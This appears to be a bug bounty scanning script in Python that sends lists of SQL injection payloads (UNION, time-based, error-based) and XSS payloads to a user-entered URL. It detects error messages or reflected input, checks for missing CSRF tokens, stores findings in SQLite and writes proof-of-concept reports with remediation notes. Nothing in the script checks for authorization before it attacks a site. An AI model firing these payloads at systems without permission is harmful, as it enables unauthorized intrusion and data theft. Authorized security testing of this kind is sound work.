#!/usr/bin/env python3
"""
ğŸ¯ BUG BOUNTY HUNTER PRO - VULNERABILITY TESTING SCRIPT
Automated payload testing and proof of concept generation
"""

import requests
import urllib.parse
import time
import json
import sqlite3
from datetime import datetime
from pathlib import Path
import base64

class VulnerabilityTester:
    def __init__(self, database_path=None):
        self.database_path = database_path or Path.home() / 'bb_pro_workspace' / 'bb_pro.db'
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # Common SQL injection payloads
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "\" OR \"1\"=\"1",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--", 
            "' UNION SELECT NULL,NULL,NULL--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR SLEEP(5)--",
            "' AND (SELECT SUBSTRING(@@version,1,1))='M'--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
            "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
        ]
        
        # Common XSS payloads
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<script>alert(document.domain)</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "<object data=\"javascript:alert('XSS')\">",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "%3Cscript%3Ealert('XSS')%3C/script%3E"
        ]

    def test_sql_injection(self, url, parameter):
        """Test for SQL injection vulnerabilities"""
        print(f"ğŸ” Testing SQL injection on {url} parameter: {parameter}")
        vulnerabilities = []
        
        for payload in self.sql_payloads:
            try:
                # Test GET parameter
                test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, timeout=10)
                
                # Check for SQL error messages
                sql_errors = [
                    "sql syntax",
                    "mysql_fetch",
                    "ORA-01756",
                    "Microsoft OLE DB Provider",
                    "Unclosed quotation mark",
                    "ODBC Microsoft Access Driver",
                    "PostgreSQL query failed",
                    "Warning: mysql_",
                    "MySqlException",
                    "valid MySQL result",
                    "OracleException",
                    "Microsoft JET Database",
                    "Error Executing Database Query"
                ]
                
                for error in sql_errors:
                    if error.lower() in response.text.lower():
                        vuln = {
                            'type': 'SQL Injection',
                            'severity': 'High',
                            'url': test_url,
                            'parameter': parameter,
                            'payload': payload,
                            'evidence': f"SQL error detected: {error}",
                            'response_time': response.elapsed.total_seconds(),
                            'status_code': response.status_code
                        }
                        vulnerabilities.append(vuln)
                        print(f"  âœ… SQL Injection found with payload: {payload}")
                        break
                
                # Test for time-based blind SQL injection
                if 'SLEEP' in payload or 'WAITFOR' in payload or 'pg_sleep' in payload:
                    if response.elapsed.total_seconds() > 4:
                        vuln = {
                            'type': 'Blind SQL Injection (Time-based)',
                            'severity': 'High',
                            'url': test_url,
                            'parameter': parameter,
                            'payload': payload,
                            'evidence': f"Response time: {response.elapsed.total_seconds():.2f}s",
                            'response_time': response.elapsed.total_seconds(),
                            'status_code': response.status_code
                        }
                        vulnerabilities.append(vuln)
                        print(f"  âœ… Time-based SQL Injection found: {response.elapsed.total_seconds():.2f}s delay")
                
            except Exception as e:
                print(f"  âŒ Error testing payload {payload}: {str(e)}")
                continue
            
            time.sleep(1)  # Rate limiting
        
        return vulnerabilities

    def test_xss(self, url, parameter):
        """Test for XSS vulnerabilities"""
        print(f"ğŸ” Testing XSS on {url} parameter: {parameter}")
        vulnerabilities = []
        
        for payload in self.xss_payloads:
            try:
                # Test GET parameter
                test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, timeout=10)
                
                # Check if payload is reflected in response
                if payload in response.text or urllib.parse.unquote(payload) in response.text:
                    vuln = {
                        'type': 'Reflected XSS',
                        'severity': 'Medium',
                        'url': test_url,
                        'parameter': parameter,
                        'payload': payload,
                        'evidence': f"Payload reflected in response",
                        'response_time': response.elapsed.total_seconds(),
                        'status_code': response.status_code
                    }
                    vulnerabilities.append(vuln)
                    print(f"  âœ… Reflected XSS found with payload: {payload}")
                
                # Test POST data
                post_data = {parameter: payload}
                post_response = self.session.post(url, data=post_data, timeout=10)
                
                if payload in post_response.text:
                    vuln = {
                        'type': 'Stored XSS',
                        'severity': 'High',
                        'url': url,
                        'parameter': parameter,
                        'payload': payload,
                        'evidence': f"Payload stored and reflected",
                        'response_time': post_response.elapsed.total_seconds(),
                        'status_code': post_response.status_code
                    }
                    vulnerabilities.append(vuln)
                    print(f"  âœ… Stored XSS found with payload: {payload}")
                
            except Exception as e:
                print(f"  âŒ Error testing payload {payload}: {str(e)}")
                continue
            
            time.sleep(1)  # Rate limiting
        
        return vulnerabilities

    def test_csrf(self, url):
        """Test for CSRF vulnerabilities"""
        print(f"ğŸ” Testing CSRF on {url}")
        vulnerabilities = []
        
        try:
            response = self.session.get(url, timeout=10)
            
            # Check for CSRF tokens
            csrf_indicators = [
                'csrf_token',
                '_token',
                'csrfmiddlewaretoken',
                'authenticity_token',
                '_csrf'
            ]
            
            has_csrf_protection = False
            for indicator in csrf_indicators:
                if indicator in response.text.lower():
                    has_csrf_protection = True
                    break
            
            # Check for SameSite cookie attribute
            has_samesite = False
            for cookie in response.cookies:
                if hasattr(cookie, 'samesite') and cookie.samesite:
                    has_samesite = True
                    break
            
            if not has_csrf_protection and not has_samesite:
                vuln = {
                    'type': 'CSRF',
                    'severity': 'Medium',
                    'url': url,
                    'parameter': 'N/A',
                    'payload': 'N/A',
                    'evidence': 'No CSRF protection detected',
                    'response_time': response.elapsed.total_seconds(),
                    'status_code': response.status_code
                }
                vulnerabilities.append(vuln)
                print(f"  âœ… CSRF vulnerability found: No protection detected")
        
        except Exception as e:
            print(f"  âŒ Error testing CSRF: {str(e)}")
        
        return vulnerabilities

    def save_vulnerability(self, vulnerability):
        """Save vulnerability to database"""
        try:
            conn = sqlite3.connect(self.database_path)
            cursor = conn.cursor()
            
            # Get target ID (create if doesn't exist)
            domain = urllib.parse.urlparse(vulnerability['url']).netloc
            cursor.execute('SELECT id FROM targets WHERE domain = ?', (domain,))
            target = cursor.fetchone()
            
            if not target:
                cursor.execute('''
                    INSERT INTO targets (domain, status, created_at)
                    VALUES (?, 'scanned', ?)
                ''', (domain, datetime.now()))
                target_id = cursor.lastrowid
            else:
                target_id = target[0]
            
            # Save vulnerability
            cursor.execute('''
                INSERT INTO vulnerabilities 
                (target_id, vulnerability_type, severity, title, description, 
                 url_path, method, parameter, payload, evidence, status, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'found', ?)
            ''', (
                target_id,
                vulnerability['type'],
                vulnerability['severity'],
                f"{vulnerability['type']} in {vulnerability['parameter']}",
                f"Found {vulnerability['type']} vulnerability using payload: {vulnerability['payload']}",
                vulnerability['url'],
                'GET',
                vulnerability['parameter'],
                vulnerability['payload'],
                vulnerability['evidence'],
                datetime.now()
            ))
            
            conn.commit()
            conn.close()
            print(f"  ğŸ’¾ Vulnerability saved to database")
            
        except Exception as e:
            print(f"  âŒ Error saving vulnerability: {str(e)}")

    def generate_poc(self, vulnerability):
        """Generate proof of concept"""
        poc = f"""
# Vulnerability Proof of Concept

## Summary
- **Type**: {vulnerability['type']}
- **Severity**: {vulnerability['severity']}
- **URL**: {vulnerability['url']}
- **Parameter**: {vulnerability['parameter']}

## Proof of Concept

### Step 1: Navigate to the vulnerable page
```
{vulnerability['url'].split('?')[0]}
```

### Step 2: Submit the following payload in the '{vulnerability['parameter']}' parameter
```
{vulnerability['payload']}
```

### Step 3: Full exploitation URL
```
{vulnerability['url']}
```

### Evidence
{vulnerability['evidence']}

### Technical Details
- **Response Time**: {vulnerability['response_time']:.2f} seconds
- **Status Code**: {vulnerability['status_code']}
- **Timestamp**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

### Impact
"""
        
        if 'SQL' in vulnerability['type']:
            poc += """
- Data extraction from database
- Authentication bypass
- Data modification/deletion
- Potential remote code execution
"""
        elif 'XSS' in vulnerability['type']:
            poc += """
- Session hijacking
- Credential theft
- Malicious script execution
- Phishing attacks
"""
        elif 'CSRF' in vulnerability['type']:
            poc += """
- Unauthorized actions on behalf of authenticated users
- Account takeover
- Data modification
"""
        
        poc += """
### Remediation
- Implement proper input validation
- Use parameterized queries for SQL injection
- Encode output for XSS prevention
- Implement CSRF tokens
- Apply security headers
"""
        
        return poc

    def scan_target(self, url, parameters=None):
        """Comprehensive vulnerability scan"""
        print(f"ğŸ¯ Starting comprehensive scan of {url}")
        
        if not parameters:
            parameters = ['id', 'user', 'search', 'q', 'name', 'email', 'page', 'category']
        
        all_vulnerabilities = []
        
        # Test each parameter
        for param in parameters:
            print(f"\nğŸ“‹ Testing parameter: {param}")
            
            # SQL Injection tests
            sql_vulns = self.test_sql_injection(url, param)
            all_vulnerabilities.extend(sql_vulns)
            
            # XSS tests
            xss_vulns = self.test_xss(url, param)
            all_vulnerabilities.extend(xss_vulns)
        
        # CSRF test
        csrf_vulns = self.test_csrf(url)
        all_vulnerabilities.extend(csrf_vulns)
        
        # Save all vulnerabilities
        for vuln in all_vulnerabilities:
            self.save_vulnerability(vuln)
        
        # Generate summary report
        print(f"\nğŸ“Š Scan Summary:")
        print(f"  Total vulnerabilities found: {len(all_vulnerabilities)}")
        for vuln_type in ['SQL Injection', 'XSS', 'CSRF']:
            count = len([v for v in all_vulnerabilities if vuln_type in v['type']])
            if count > 0:
                print(f"  {vuln_type}: {count}")
        
        return all_vulnerabilities

def main():
    """Main testing function"""
    print("ğŸ¯ Bug Bounty Hunter Pro - Vulnerability Tester")
    print("=" * 50)
    
    # Initialize tester
    tester = VulnerabilityTester()
    
    # Example usage
    target_url = input("Enter target URL (e.g., https://example.com/search): ")
    
    if not target_url:
        # Demo with test URLs
        test_urls = [
            "https://httpbin.org/get",
            "https://example.com/search"
        ]
        
        for url in test_urls:
            print(f"\nğŸ¯ Testing {url}")
            vulnerabilities = tester.scan_target(url)
            
            # Generate POCs
            for vuln in vulnerabilities:
                poc = tester.generate_poc(vuln)
                print(f"\nğŸ“ Proof of Concept:\n{poc}")
    else:
        # Scan user-provided URL
        vulnerabilities = tester.scan_target(target_url)
        
        # Generate POCs
        for vuln in vulnerabilities:
            poc = tester.generate_poc(vuln)
            print(f"\nğŸ“ Proof of Concept:\n{poc}")
            
            # Save POC to file
            filename = f"poc_{vuln['type'].replace(' ', '_').lower()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
            with open(filename, 'w') as f:
                f.write(poc)
            print(f"  ğŸ’¾ POC saved to {filename}")

if __name__ == "__main__":
    main()
